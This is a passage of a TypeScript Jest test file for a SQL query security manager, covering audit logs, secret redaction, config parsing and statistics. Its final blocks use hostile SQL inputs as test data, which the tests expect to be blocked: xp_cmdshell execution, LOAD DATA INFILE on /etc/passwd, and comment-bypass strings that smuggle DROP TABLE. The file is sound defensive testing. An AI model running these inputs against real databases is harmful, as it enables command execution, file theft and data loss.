    test('should create audit log for batch query', () => {
      const log = securityManager.createAuditLog(
        'testdb',
        ['SELECT 1', 'SELECT 2'],
        false,
        'blocked'
      );

      expect(log.query_type).toBe('BATCH');
      expect(log.query_count).toBe(2);
      expect(log.allowed).toBe(false);
      expect(log.severity).toBe('WARNING');
      expect(log.reason).toBe('blocked');
    });

    test('should truncate long queries in audit log', () => {
      const longQuery = 'SELECT ' + 'x'.repeat(600);
      const log = securityManager.createAuditLog('testdb', longQuery, true);

      expect(log.query.length).toBeLessThanOrEqual(500);
    });

    test('should include metadata in audit log', () => {
      const log = securityManager.createAuditLog('testdb', 'SELECT 1', true, undefined, {
        user: 'admin',
      });

      expect(log.metadata).toEqual({ user: 'admin' });
    });

    test('should include sourceIP from environment', () => {
      const log = securityManager.createAuditLog('testdb', 'SELECT 1', true);
      expect(log.sourceIP).toBeDefined();
    });
  });

  describe('Error message sanitization', () => {
    test('should redact password in error messages', () => {
      const sanitized = securityManager.sanitizeErrorMessage(
        'Connection failed: password=mysecret123'
      );
      expect(sanitized).toContain('password=[REDACTED]');
      expect(sanitized).not.toContain('mysecret123');
    });

    test('should redact pwd in error messages', () => {
      const sanitized = securityManager.sanitizeErrorMessage('Error: pwd=secret123');
      expect(sanitized).toContain('pwd=[REDACTED]');
    });

    test('should redact token in error messages', () => {
      const sanitized = securityManager.sanitizeErrorMessage('Auth failed: token=abc123xyz');
      expect(sanitized).toContain('token=[REDACTED]');
    });

    test('should redact key in error messages', () => {
      const sanitized = securityManager.sanitizeErrorMessage('API error: key=sk-123456');
      expect(sanitized).toContain('key=[REDACTED]');
    });

    test('should redact secret in error messages', () => {
      const sanitized = securityManager.sanitizeErrorMessage('Error: secret=mysecretvalue');
      expect(sanitized).toContain('secret=[REDACTED]');
    });

    test('should redact credit card numbers', () => {
      const sanitized = securityManager.sanitizeErrorMessage('Card: 1234-5678-9012-3456');
      expect(sanitized).toContain('XXXX-XXXX-XXXX-XXXX');
    });

    test('should redact SSN format', () => {
      const sanitized = securityManager.sanitizeErrorMessage('SSN: 123-45-6789');
      expect(sanitized).toContain('XXX-XX-XXXX');
    });

    test('should truncate long error messages to 500 characters', () => {
      const longMessage = 'x'.repeat(1000);
      const sanitized = securityManager.sanitizeErrorMessage(longMessage);
      expect(sanitized.length).toBeLessThanOrEqual(500);
    });
  });

  describe('Initialize method', () => {
    test('should update complexity limits from config', () => {
      securityManager.initialize({
        databases: {},
        security: {
          max_joins: 20,
          max_subqueries: 10,
          max_unions: 5,
          max_group_bys: 8,
          max_complexity_score: 200,
          max_query_length: 20000,
        },
      });

      const config = securityManager.getConfig();
      expect(config.security?.max_joins).toBe(20);
      expect(config.security?.max_subqueries).toBe(10);
      expect(config.security?.max_unions).toBe(5);
    });

    test('should not change limits when no security config provided', () => {
      const configBefore = securityManager.getConfig();
      securityManager.initialize({ databases: {} });
      const configAfter = securityManager.getConfig();

      expect(configBefore.security?.max_joins).toEqual(configAfter.security?.max_joins);
    });
  });

  describe('Statistics tracking', () => {
    test('should track queries validated and allowed', async () => {
      await securityManager.validateQuery('SELECT 1');
      await securityManager.validateQuery('SELECT 2');

      const stats = securityManager.getStatistics();
      expect(stats.queriesValidated).toBe(2);
      expect(stats.queriesAllowed).toBe(2);
      expect(stats.queriesBlocked).toBe(0);
    });

    test('should track blocked queries', async () => {
      await securityManager.validateQuery('INSERT INTO t VALUES (1)');

      const stats = securityManager.getStatistics();
      expect(stats.queriesBlocked).toBe(1);
    });

    test('should compute average complexity', async () => {
      await securityManager.validateQuery('SELECT 1');
      const stats = securityManager.getStatistics();
      expect(typeof stats.avgComplexity).toBe('number');
    });
  });

  describe('parseConfigValue via constructor', () => {
    test('should parse string config values', () => {
      const sm = new SecurityManager({
        security: {
          max_joins: '15' as any,
          max_subqueries: '8' as any,
        },
      });
      const config = sm.getConfig();
      expect(config.security?.max_joins).toBe(15);
      expect(config.security?.max_subqueries).toBe(8);
    });

    test('should use defaults for invalid string values', () => {
      const sm = new SecurityManager({
        security: {
          max_joins: 'abc' as any,
        },
      });
      const config = sm.getConfig();
      expect(config.security?.max_joins).toBe(10); // default
    });

    test('should use defaults for undefined values', () => {
      const sm = new SecurityManager({});
      const config = sm.getConfig();
      expect(config.security?.max_joins).toBe(10);
      expect(config.security?.max_subqueries).toBe(5);
    });
  });

  describe('validateAnyQuery - dangerous command blocking', () => {
    let manager: SecurityManager;
    beforeEach(() => {
      manager = new SecurityManager({}, false);
    }); // select_only=false

    it.each(['EXEC sp_foo', 'EXECUTE sp_foo', 'CALL my_proc()'])(
      'blocks %s even in non-SELECT mode',
      async (query) => {
        const result = await manager.validateQuery(query);
        expect(result.allowed).toBe(false);
        expect(result.reason).toMatch(/not allowed/i);
      }
    );

    it('allows INSERT in non-SELECT mode', async () => {
      const result = await manager.validateQuery('INSERT INTO t(a) VALUES (1)');
      expect(result.allowed).toBe(true);
    });
  });

  describe('validateAnyQuery regression', () => {
    let writeManager: SecurityManager;

    beforeEach(() => {
      writeManager = new SecurityManager({ security: defaultConfig }, false);
    });

    test('should block EXEC even in write mode', async () => {
      const result = await writeManager.validateQuery('EXEC xp_cmdshell "dir"');
      expect(result.allowed).toBe(false);
    });

    test('should block LOAD even in write mode', async () => {
      const result = await writeManager.validateQuery(
        "LOAD DATA INFILE '/etc/passwd' INTO TABLE t"
      );
      expect(result.allowed).toBe(false);
    });

    test('should allow INSERT in write mode', async () => {
      const result = await writeManager.validateQuery("INSERT INTO t VALUES (1, 'a')");
      expect(result.allowed).toBe(true);
    });
  });

  describe('MySQL version-conditional comment bypass', () => {
    test('should block queries with /*! version-conditional comments', async () => {
      const result = await securityManager.validateQuery('SELECT 1 /*!50000 ; DROP TABLE users */');
      expect(result.allowed).toBe(false);
      expect(result.reason).toContain('version-conditional');
    });

    test('should block queries with /*! without version number', async () => {
      const result = await securityManager.validateQuery('SELECT 1 /*! DROP TABLE users */');
      expect(result.allowed).toBe(false);
    });

    test('should still allow normal comments', async () => {
      const result = await securityManager.validateQuery('SELECT /* this is fine */ 1 FROM users');
      expect(result.allowed).toBe(true);
    });
  });
});
